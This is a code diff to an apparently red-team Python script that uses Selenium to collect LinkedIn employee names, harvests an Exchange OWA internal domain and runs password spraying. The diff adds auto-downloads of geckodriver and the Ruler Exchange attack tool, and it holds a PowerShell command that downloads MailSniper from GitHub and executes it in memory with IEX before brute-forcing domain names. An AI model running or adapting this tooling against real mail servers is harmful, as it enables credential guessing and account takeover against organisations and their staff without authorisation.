@@ -1,18 +1,30 @@
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
-import time, getpass, re, os, signal, sys
+import time, getpass, re, os, signal, sys, zipfile, urllib.request
 
 def signal_handler(sig, frame):
     print('You pressed Ctrl+C!')
     os.system("taskkill /F /im firefox.exe")
     sys.exit(0)
 
-def setup_env():        
+def setup_env():
     if os.name != "nt":
         print("Script must run on windows.")
         sys.exit(0)
+    
+    if not os.path.exists('geckodriver.exe'):
+        print("Downloading geckodriver.exe")
+        urllib.request.urlretrieve ("https://github.com/mozilla/geckodriver/releases/download/v0.29.0/geckodriver-v0.29.0-win64.zip", "geckodriver.zip")
+        with zipfile.ZipFile("geckodriver.zip", 'r') as zip_ref:
+            zip_ref.extractall(".")
             
+        os.remove("geckodriver.zip")
+            
+    if not os.path.exists('ruler-win64.exe'):
+        print("Downloading ruler-win64.exe")
+        urllib.request.urlretrieve ("https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-win64.exe", "ruler-win64.exe")
+        
     signal.signal(signal.SIGINT, signal_handler)
 
 def clean_users(tmp):
@@ -31,7 +43,7 @@ def clean_users(tmp):
     return usernames
 
 def mailsniper_internaldomain(server, company_name):
-    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-DomainHarvestOWA -ExchHostname ' + server + ' > internal_domain_part1.txt; Invoke-DomainHarvestOWA -ExchHostname ' + server + ' -CompanyName \'' + company_name + '\' -Brute -OutFile internal_domain_part2.txt"'
+    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-DomainHarvestOWA -ExchHostname ' + server + '; Invoke-DomainHarvestOWA -ExchHostname ' + server + ' -CompanyName \'' + company_name + '\' -Brute"'
     print(command)
     os.system(command)
 
@@ -213,7 +225,7 @@ def get_employees(username, password, company_id):
 
 try:
     setup_env()
-    
+    """
     print("Enter your linkedin information...")
     username = input('Enter your email: ')
     password = getpass.getpass('Enter your password: ')
@@ -263,7 +275,7 @@ try:
     
     print("Exec password spray.")
     mailsniper_passwordspray(server, valid_password, "modified_address_list.txt", "valid_passwords_part2.txt")
-
+    """
 except Exception as e:
     print('Exception has occurred!', e)
     os.system("taskkill /F /im firefox.exe")
